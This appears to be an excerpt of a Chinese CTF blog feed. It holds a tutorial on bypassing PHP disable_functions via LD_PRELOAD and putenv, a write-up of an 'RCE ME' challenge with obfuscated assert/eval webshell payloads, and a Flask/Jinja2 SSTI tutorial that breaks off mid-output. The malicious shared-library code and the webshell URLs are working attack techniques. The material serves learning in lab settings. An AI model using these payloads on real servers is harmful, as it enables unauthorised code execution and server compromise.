src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235644482.png" alt="image-20211020235644482"></p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235657704.png" alt="image-20211020235657704"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一打开页面，很魔性。。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020233731895.</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="jwt" scheme="https://sakurahack-y.github.io/tags/jwt/"/>
    
  </entry>
  
  <entry>
    <title>通过LD_PRELOAD与putenv组合拳绕过disable_functions函数</title>
    <link href="https://sakurahack-y.github.io/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/"/>
    <id>https://sakurahack-y.github.io/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/</id>
    <published>2021-10-19T15:10:48.000Z</published>
    <updated>2021-10-19T16:10:08.221Z</updated>
    
    <content type="html"><![CDATA[<p>使用场景：</p><p>当拿到了一个网站shell，但命令基本都无法使用时，就很有可能是disable_functions导致的。</p><p>无命令执行功能的 webshell 是无意义的，得突破！</p><p>首先来介绍下我们需要使用的两个函数：</p><p>LD_PRELOAD:</p><p>google给出如下定义：</p><pre><code>LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.</code></pre><p>即LD_PRELOAD这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用。</p><p>PUTENV函数：可以设置环境变量</p><pre><code class="php">putenv ( string $setting ) : bool</code></pre><p>添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。</p><p>一般而言，利用漏洞控制 web 启动新进程 a.bin，a.bin 内部调用系统函数 b()，b()  位于系统共享对象 c.so  中，所以系统为该进程加载共 c.so，想法在 c.so 前优先加载可控的 c_evil.so，c_evil.so  内含与 b()  同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内 b() 而非系统的  c.so 内  b()，同时，c_evil.so 可控，达到执行恶意代码的目的。</p><h2 id="传统方式-hijacking-function"><a href="#传统方式-hijacking-function" class="headerlink" title="传统方式(hijacking function)"></a>传统方式(hijacking function)</h2><p>在已有的文章中显示，一般使用php<code>mail()</code>函数进行触发，我们简单分析一下</p><p>这里简单写个demo</p><pre><code class="php">&lt;?phpmail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);?&gt;</code></pre><p>我们strace一下，可以看到运行这个脚本的时候，程序会启子进程来调用sendmail</p><pre><code>execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;test.php&quot;], [/* 20 vars */]) = 0[pid 23864] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;/usr/sbin/sendmail -t -i &quot;], [/* 20 vars */]) = 0[pid 23865] execve(&quot;/usr/sbin/sendmail&quot;, [&quot;/usr/sbin/sendmail&quot;, &quot;-t&quot;, &quot;-i&quot;], [/* 20 vars */]) = 0</code></pre><p>那么我们只要看一下sendmail使用了哪些函数</p><p><a href="https://p5.ssl.qhimg.com/t01c76b4a9b6bc50197.png"><img src="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/t01c76b4a9b6bc50197.png" alt="img"></a></p><p>有很多函数可以使用，这里可以选择geteuid()，然后我们编写自己的evil shared libraries：hack.c</p><pre><code class="c">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload() &#123;        system(&quot;ls / &gt; /tmp/sky&quot;);&#125;int geteuid() &#123;    if (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123; return 0; &#125;    unsetenv(&quot;LD_PRELOAD&quot;);    payload();&#125;</code></pre><p>然后编译一下</p><pre><code>gcc -c -fPIC hack.c -o hackgcc --share hack -o hack.so</code></pre><p>然后我们运行脚本</p><pre><code class="php">&lt;?phpputenv(&quot;LD_PRELOAD=./hack.so&quot;);mail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);?&gt;</code></pre><p><a href="https://p0.ssl.qhimg.com/t01afcea293e08668c6.png"><img src="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/t01afcea293e08668c6.png" alt="img"></a></p><p>不难发现它执行了命令，然后可以发现/tmp目录下多了一个文件sky</p><pre><code>root@sky:~# ls /tmp | grep skysky</code></pre><p>我们查看一下</p><pre><code>root@sky:~# cat /tmp/skybinbootdevetchomeliblib32....</code></pre><p>发现成功执行命令</p><p>但是这是基于存在sendmail()这个常用函数的基础上，如果目标的sendmail()函数也被禁用了那该怎么办呢？</p><p>下面来介绍改进版的：</p><h2 id="改进版-hijack-shared-library"><a href="#改进版-hijack-shared-library" class="headerlink" title="改进版(hijack shared library)"></a>改进版(hijack shared library)</h2><p>已经没有了sendmail，但我们依旧可以进行rce，可使用如下文件sky.c</p><pre><code>#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;__attribute__ ((__constructor__)) void angel (void)&#123;    unsetenv(&quot;LD_PRELOAD&quot;);    system(&quot;ls&quot;);&#125;</code></pre><p>其中<code>__attribute__ ((__constructor__))</code>有如下说明</p><pre><code>1.It&#39;s run when a shared library is loaded, typically during program startup.2.That&#39;s how all GCC attributes are; presumably to distinguish them from function calls.3.The destructor is run when the shared library is unloaded, typically at program exit.</code></pre><p>所以当我们最开始将evil shared library load上后，就会触发<code>__attribute__ ((__constructor__))</code>，从而达成我们rce的目的.</p><p>常考察的还有php-imagick</p><p>我们发现如下对应关系</p><p><a href="https://p0.ssl.qhimg.com/t018ee5e5eadefc3997.png"><img src="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/t018ee5e5eadefc3997.png" alt="img"></a></p><p>我们发现当文件是MPEG format时，程序会调用’ffmpeg’ program进行转换，而如下后缀都被认为成MPEG format</p><p><a href="https://p2.ssl.qhimg.com/t01b63cd8517778cd0f.png"><img src="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/t01b63cd8517778cd0f.png" alt="img"></a></p><p>我们测试一下.wmv</p><p>写出脚本</p><pre><code class="php">&lt;?php$img = new Imagick(&#39;sky.wmv&#39;);?&gt;</code></pre><p>我们测试一下</p><pre><code>execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;sky.php&quot;], [/* 21 vars */]) = 0[pid 25217] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;&quot;ffmpeg&quot; -v -1 -i &quot;/tmp/magick-2&quot;...], [/* 21 vars */]) = 0</code></pre><p>可以发现的确成功启动了子进程，调用了ffmpeg</p><p>但是如果sky.wmv文件不存在时</p><pre><code>execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;sky.php&quot;], [/* 21 vars */]) = 0</code></pre><p>则不会调用ffmpeg</p><p>所以也不难分析出，应该是有一步判断文件是否存在的操作，再会去进行调用相关程序进行解码转换的操作</p><p>所以如果想利用Imagick新起子进程，那么我们得先有后面的参数文件，当然这并不是什么难事。</p><p> payload &amp; attack</p><p>那么只剩最后的攻击了，找到了可以起子进程的方式，只差构造evil shared library了</p><p>我们还是用之前的sky.c</p><pre><code class="c">#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;__attribute__ ((__constructor__)) void angel (void)&#123;    unsetenv(&quot;LD_PRELOAD&quot;);    system(&quot;ls&quot;);&#125;</code></pre><p>然后编译一下</p><pre><code>gcc -c -fPIC sky.c -o skygcc --share sky -o sky.so</code></pre><p>测试一下</p><pre><code class="php">&lt;?phpputenv(&quot;LD_PRELOAD=./sky.so&quot;);$img = new Imagick(&#39;sky.wmv&#39;);?&gt;</code></pre><p>运行发现</p><pre><code>root@sky:~# php sky.phpbin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib32  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys    test  tmp  usr    var  vmlinuz  vmlinuz.oldPHP Fatal error:  Uncaught ImagickException: unable to open image `/tmp/magick-25528VpF8npGTawCz.pam&#39;: No such file or directory @ error/blob.c/OpenBlob/2712 in /root/sky.php:3Stack trace:#0 /root/sky.php(3): Imagick-&gt;__construct(&#39;sky.wmv&#39;)#1 &#123;main&#125;  thrown in /root/sky.php on line 3</code></pre><p>我们成功的进行了列目录</p><p>这里串一下思路：</p><p>首先执行sky.php ,设置了恶意环境变量。下一步我们需要调用子进程来加载环境变量，所以这里就会使用new imagick(‘sky.wmv’),调用了ffmpeg这个子进程，这个进程在加载之前就调用了环境变量，加载了共享对象sky.so.加载完后它会自动执行__attribute__ ((<strong>constructor</strong>)),就会调用system命令。</p><h2 id="getflag流程"><a href="#getflag流程" class="headerlink" title="getflag流程:"></a>getflag流程:</h2><p>那么现在思路很清晰：</p><p>1.把我们的sky.so和sky.wmv上传到题目的/tmp/sandbox中</p><p>2.利用backdoor运行sky.php</p><p>3.在tmp目录读取重定向的结果</p><p>参考：<a href="https://www.anquanke.com/post/id/175403">https://www.anquanke.com/post/id/175403</a> （膜拜大佬，基本都是搬过来的，自己的代码功底太弱，大佬讲的又非常好就搬运了一下）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;使用场景：&lt;/p&gt;
&lt;p&gt;当拿到了一个网站shell，但命令基本都无法使用时，就很有可能是disable_functions导致的。&lt;/p&gt;
&lt;p&gt;无命令执行功能的 webshell 是无意义的，得突破！&lt;/p&gt;
&lt;p&gt;首先来介绍下我们需要使用的两个函数：&lt;/p&gt;
&lt;p&gt;L</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="绕过" scheme="https://sakurahack-y.github.io/categories/CTF/%E7%BB%95%E8%BF%87/"/>
    
    
    <category term="绕过" scheme="https://sakurahack-y.github.io/tags/%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战 2019 RCE ME __0X01-0X0F</title>
    <link href="https://sakurahack-y.github.io/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/"/>
    <id>https://sakurahack-y.github.io/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/</id>
    <published>2021-10-18T06:24:58.000Z</published>
    <updated>2021-10-19T15:09:41.497Z</updated>
    
    <content type="html"><![CDATA[<h1 id="打开题目，源码如图，看起来很简单："><a href="#打开题目，源码如图，看起来很简单：" class="headerlink" title="打开题目，源码如图，看起来很简单："></a>打开题目，源码如图，看起来很简单：</h1><pre><code class="php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;]))&#123;            $code=$_GET[&#39;code&#39;];                    if(strlen($code)&gt;40)&#123;                                        die(&quot;This is too Long.&quot;);                                                &#125;                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;                                        die(&quot;NO.&quot;);                                                &#125;                    @eval($code);&#125;else&#123;            highlight_file(__FILE__);&#125;// ?&gt;</code></pre><p>重点关注 preg_match() 函数，它将所有的字母和数字都进行了过滤，所以我们无法通过$code直接传入命令，因此需要绕过。</p><p>最常用的就是取反绕过。</p><p>先取phpinfo来测试一下</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018143439534.png" alt="image-20211018143439534"></p><p>为什么要加urlencode()？这里是因为字符串取反后会变成无法识别的字符，而这也是能绕过preg_match()函数的原因。</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018143653122.png" alt="image-20211018143653122"></p><p>成功得到信息。</p><p>下一步考虑通过取反来构建webshell。</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018143038799.png" alt="image-20211018143038799"></p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018143850709.png" alt="image-20211018143850709"></p><p>测试一下webshell是否有效：</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018144115367.png" alt="image-20211018144115367"></p><p>成功，使用蚁剑来连接一下。</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018144244347.png" alt="image-20211018144244347"></p><p>连接成功。</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018144318564.png" alt="image-20211018144318564"></p><p>在根目录发现了readflag和flag，根据经验是要我们执行readflag来获取到flag。</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018144428698.png" alt="image-20211018144428698"></p><p>这时候就懵逼了，命令无法执行是一个废shell。</p><p>让我们再会到phpinfo()仔细观察，发现如下：</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018143523288.png" alt="image-20211018143523288"></p><p>敏感函数基本全被禁用了。</p><p>那我们就要绕过disable_functions来执行readflag文件了。</p><h2 id="蚁剑中有一个插件可以绕过disable-functions-非预期解法"><a href="#蚁剑中有一个插件可以绕过disable-functions-非预期解法" class="headerlink" title="蚁剑中有一个插件可以绕过disable_functions(非预期解法)"></a>蚁剑中有一个插件可以绕过disable_functions(非预期解法)</h2><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018144830831.png" alt="image-20211018144830831"></p><p>启用插件，选择</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018145031532.png" alt="image-20211018145031532"></p><p>发现成功绕过，并执行readflag文件获取到了flag</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018145133785.png" alt="image-20211018145133785"></p><h2 id="通过LD-PRELOAD与putenv来执行命令"><a href="#通过LD-PRELOAD与putenv来执行命令" class="headerlink" title="通过LD_PRELOAD与putenv来执行命令"></a>通过LD_PRELOAD与putenv来执行命令</h2><p>基本思路：</p><p>利用linux提供的LD_preload环境变量，劫持共享so，在启动子进程的时候，新的子进程会加载我们恶意的so拓展，然后我们可以在so里面定义同名函数，即可劫持API调用，成功RCE。在另一篇博客中我会详细的介绍下这个，这里不做深入讨论。</p><p>发现/var/tmp目录下有上传权限，上传exp，<img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211019221359870.png" alt="image-20211019221359870"></p><p>bypass_disablefunc.php 为命令执行 webshell，提供三个 GET 参数：</p><pre><code>http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so</code></pre><p>由于在本题中对code有字符数量的限制，所以需要修改我们的payload为异或：</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211019230656350.png" alt="image-20211019230656350"></p><pre><code>?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=include(%27/var/tmp/shell.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/tmpfile&amp;sopath=/var/tmp/bypass_disablefunc_x64.so</code></pre><pre><code>?code=$&#123;_GET&#125;[_]($&#123;_GET&#125;[_]);&amp;_=assert&amp;_=eval($_POST[&#39;a&#39;])</code></pre><pre><code>http://543c3847-4a06-4587-b8a5-7be27d7b7d7d.node4.buuoj.cn:81/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=include(%27/var/tmp/bypass_disablefunc.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/xx&amp;sopath=/var/tmp/bypass_disablefunc_x64.so</code></pre><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211019225739892.png" alt="image-20211019225739892"></p><p>看网上的大多数是第一种解法，感觉大家都太浮躁，我也不例外。不能为了刷题而刷题。掌握知识点和方法，才能在遇到相似题目时能够及时写出来。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;打开题目，源码如图，看起来很简单：&quot;&gt;&lt;a href=&quot;#打开题目，源码如图，看起来很简单：&quot; class=&quot;headerlink&quot; title=&quot;打开题目，源码如图，看起来很简单：&quot;&gt;&lt;/a&gt;打开题目，源码如图，看起来很简单：&lt;/h1&gt;&lt;pre&gt;&lt;code cl</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="rec" scheme="https://sakurahack-y.github.io/tags/rec/"/>
    
  </entry>
  
  <entry>
    <title>ssti-flak框架</title>
    <link href="https://sakurahack-y.github.io/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/"/>
    <id>https://sakurahack-y.github.io/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/</id>
    <published>2021-10-15T06:46:18.000Z</published>
    <updated>2021-10-15T12:50:33.961Z</updated>
    
    <content type="html"><![CDATA[<h2 id="初始ssti漏洞"><a href="#初始ssti漏洞" class="headerlink" title="初始ssti漏洞"></a>初始ssti漏洞</h2><blockquote><p>SSTI(Server-Side Template Injection) 服务端模板注入，就是服务器模板中拼接了恶意用户输入导致各种漏洞。通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式</p></blockquote><p><strong>SSTI</strong>，<strong>服务器端模板注入</strong>(Server-Side Template Injection)</p><ul><li>服务端接收攻击者的输入，将其作为Web应用模板内容的一部分</li><li>在进行目标编译渲染的过程中，进行了语句的拼接，执行了所插入的恶意内容</li><li>从而导致信息泄露、代码执行、GetShell等问题</li><li>其影响范围主要取决于模版引擎的复杂性</li><li><strong>注意</strong>：模板引擎 和 渲染函数 本身是没有漏洞的 , 该漏洞的产生原因在于程序员对代码的不严禁与不规范 , 导致了模板可控 , 从而引发代码注入</li></ul><p>ssti漏洞其实有很多种，因为不同的框架语法不同，所以呢，我们注入的时候还要判断是什么框架</p><p>主要的模板语言（我们经常使用的是flask）</p><ul><li>Python：flask、 mako、 tornado、 django</li><li>php：smarty、 twig</li><li>java：jade、 velocity</li></ul><p>这次我们介绍的常用的flask框架，常用的语言为jinjia2。</p><h3 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h3><p>先看一段代码</p><pre><code>from flask import flask @app.route(&#39;/index/&#39;)def hello_word():    return &#39;hello word&#39;</code></pre><p><code>route</code>装饰器的作用是将函数与url绑定起来。例子中的代码的作用就是当你访问<code>http://127.0.0.1：5000/index</code>的时候，flask会返回hello word。</p><h3 id="渲染方法"><a href="#渲染方法" class="headerlink" title="渲染方法"></a>渲染方法</h3><p>flask的渲染方法有render_template和render_template_string两种。</p><p>render_template()是用来渲染一个指定的文件的。使用如下</p><pre><code>return render_template(&#39;index.html&#39;)</code></pre><p>render_template_string则是用来渲染一个字符串的。SSTI与这个方法密不可分。</p><p>使用方法如下</p><pre><code>html = &#39;&lt;h1&gt;This is index page&lt;/h1&gt;&#39;return render_template_string(html)</code></pre><h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><p>flask是使用Jinja2来作为渲染引擎的。看例子</p><p>在网站的根目录下新建<code>templates</code>文件夹，这里是用来存放html文件。也就是模板文件。</p><p>test.py</p><pre><code>from flask import Flask,url_for,redirect,render_template,render_template_string@app.route(&#39;/index/&#39;)def user_login():    return render_template(&#39;index.html&#39;)</code></pre><p>/templates/index.html</p><pre><code>&lt;h1&gt;This is index page&lt;/h1&gt;</code></pre><p>访问<code>127.0.0.1:5000/index/</code>的时候，flask就会渲染出index.html的页面。</p><p>模板文件并不是单纯的html代码，而是夹杂着模板的语法，因为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法，来传参。</p><p>例子</p><p>test.py</p><pre><code>from flask import Flask,url_for,redirect,render_template,render_template_string@app.route(&#39;/index/&#39;)def user_login():    return render_template(&#39;index.html&#39;,content=&#39;This is index page.&#39;)</code></pre><p>/templates/index.html</p><pre><code>&lt;h1&gt;&#123;&#123;content&#125;&#125;&lt;/h1&gt;</code></pre><p>这个时候页面仍然输出<code>This is index page</code>。</p><pre><code>&#123;&#123;&#125;&#125;在Jinja2中作为变量包裹标识符。```不正确的使用flask中的`render_template_string`方法会引发SSTI。那么是什么不正确的代码呢？### xss利用存在漏洞的代码```@app.route('/test/')def test():    code = request.args.get('id')    html = '''        <h3>%s</h3>    '''%(code)    return render_template_string(html)```这段代码存在漏洞的原因是数据和代码的混淆。代码中的`code`是用户可控的，会和html拼接后直接带入渲染。尝试构造code为一串js代码。![1.png](ssti-flak框架/1540787703_5bd68df77bdf5.png!small)将代码改为如下```@app.route('/test/')def test():    code = request.args.get('id')    return render_template_string('<h1>&#123;&#123; code &#125;&#125;&lt;/h1&gt;&#39;,code=code)</h1></code></pre><p>继续尝试</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/1540787852_5bd68e8c570a5.png!small" alt="2.png"></p><p>可以看到，js代码被原样输出了。这是因为模板引擎一般都默认对渲染的变量值进行编码转义，这样就不会存在xss了。在这段代码中用户所控的是code变量，而不是模板内容。存在漏洞的代码中，模板内容直接受用户控制的。</p><p>模板注入并不局限于xss，它还可以进行其他攻击。</p><h3 id="SSTI文件读取-命令执行"><a href="#SSTI文件读取-命令执行" class="headerlink" title="SSTI文件读取/命令执行"></a>SSTI文件读取/命令执行</h3><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p>在Jinja2模板引擎中，<code>&#123;&#123;&#125;&#125;`是变量包裹标识符。`&#123;&#123;&#125;&#125;</code>并不仅仅可以传递变量，还可以执行一些简单的表达式。</p><p>这里还是用上文中存在漏洞的代码</p><pre><code>@app.route(&#39;/test/&#39;)def test():    code = request.args.get(&#39;id&#39;)    html = &#39;&#39;&#39;        &lt;h3&gt;%s&lt;/h3&gt;    &#39;&#39;&#39;%(code)    return render_template_string(html)</code></pre><p>构造参数<code>&#123;&#123;2*4&#125;&#125;</code>，结果如下</p><p><img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/1540787878_5bd68ea683cce.png!small" alt="3.png">可以看到表达式被执行了。</p><p>在flask中也有一些全局变量。<img src="/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/1540787904_5bd68ec05001a.png!small" alt="4.png"></p><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>看了师傅们的文章，是通过python的对象的继承来一步步实现文件读取和命令执行的的。顺着师傅们的思路，再理一遍。</p><p>找到父类<code>&lt;type &#39;object&#39;&gt;</code>–&gt;寻找子类–&gt;找关于命令执行或者文件操作的模块。</p><p>几个魔术方法</p><pre><code>__class__  返回类型所属的对象__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。__base__   返回该对象所继承的基类// __base__和__mro__都是用来寻找基类的__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表__init__  类的初始化方法__globals__  对包含函数全局变量的字典的引用</code></pre><p>1 、获取字符串的类对象</p><pre><code>&gt;&gt;&gt; &#39;&#39;.__class__&lt;type &#39;str&#39;&gt;</code></pre><p>2 、寻找基类</p><pre><code>&gt;&gt;&gt; &#39;&#39;.__class__.__mro__(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)</code></pre><p>3 、寻找可用引用</p><pre><code>&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__()[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, &lt;type &#39;staticmethod&#39;&gt;, &lt;type &#39;complex&#39;&gt;, &lt;type &#39;float&#39;&gt;, &lt;type &#39;buffer&#39;&gt;, &lt;type &#39;long&#39;&gt;, &lt;type &#39;frozenset&#39;&gt;, &lt;type &#39;property&#39;&gt;, &lt;type &#39;memoryview&#39;&gt;, &lt;type &#39;tuple&#39;&gt;, &lt;type &#39;enumerate&#39;&gt;, &lt;type &#39;reversed&#39;&gt;, &lt;type &#39;code&#39;&gt;, &lt;type &#39;frame&#39;&gt;, &lt;type &#39;builtin_function_or_method&#39;&gt;, &lt;type &#39;instancemethod&#39;&gt;, &lt;type &#39;function&#39;&gt;, &lt;type &#39;classobj&#39;&gt;, &lt;type &#39;dictproxy&#39;&gt;, &lt;type &#39;generator&#39;&gt;, &lt;type &#39;getset_descriptor&#39;&gt;, &lt;type &#39;wrapper_descriptor&#39;&gt;, &lt;type &#39;instance&#39;&gt;, &lt;type &#39;ellipsis&#39;&gt;, &lt;type &#39;member_descriptor&#39;&gt;, &lt;type &#39;file&#39;&gt;, &lt;type &#39;PyCapsule&#39;&gt;, &lt;type &#39;cell&#39;&gt;, &lt;type &#39;callable-iterator&#39;&gt;, &lt;type &#39;iterator&#39;&gt;, &lt;type &#39;sys.long_info&#39;&gt;, &lt;type &#39;sys.float_info&#39;&gt;, &lt;type &#39;EncodingMap&#39;&gt;, &lt;type &#39;fieldnameiterator&#39;&gt;, &lt;type &#39;formatteriterator&#39;&gt;, &lt;type &#39;sys.version_info&#39;&gt;, &lt;type &#39;sys.flags&#39;&gt;, &lt;type &#39;exceptions.BaseException&#39;&gt;, &lt;type &#39;module&#39;&gt;, &lt;type &#39;imp.NullImporter&#39;&gt;, &lt;type &#39;zipimport.zipimporter&#39;&gt;, &lt;type &#39;posix.stat_result&#39;&gt;, &lt;type &#39;posix.statvfs_result&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;_abcoll.Hashable&#39;&gt;, &lt;type &#39;classmethod&#39;&gt;, &lt;class &#39;_abcoll.Iterable&#39;&gt;, &lt;class &#39;_abcoll.Sized&#39;&gt;, &lt;class &#39;_abcoll.Container&#39;&gt;, &lt;class &#39;_abcoll.Callable&#39;&gt;, &lt;type &#39;dict_keys&#39;&gt;, &lt;type &#39;dict_items&#39;&gt;, &lt;type &#39;dict_values&#39;&gt;, &lt;class &#39;site._Printer&#39;&gt;, &lt;class &#39;site._Helper&#39;&gt;, &lt;type &#39;_sre.SRE_Pattern&#39;&gt;, &lt;type &#39;_sre.SRE_Match&#39;&gt;, &lt;type &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;site.Quitter&#39;&gt;, &lt;class 